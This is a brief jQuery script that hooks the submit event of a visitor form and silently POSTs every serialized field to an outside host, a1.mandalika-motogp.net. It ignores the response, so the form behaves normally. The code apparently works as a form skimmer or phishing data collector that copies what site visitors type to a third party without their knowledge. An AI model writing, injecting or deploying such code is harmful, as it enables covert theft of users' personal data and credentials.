$(".formpengunjungalex").submit(function() {
	var d = $(".formpengunjungalex");

	$.ajax({
        url: "https://a1.mandalika-motogp.net/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
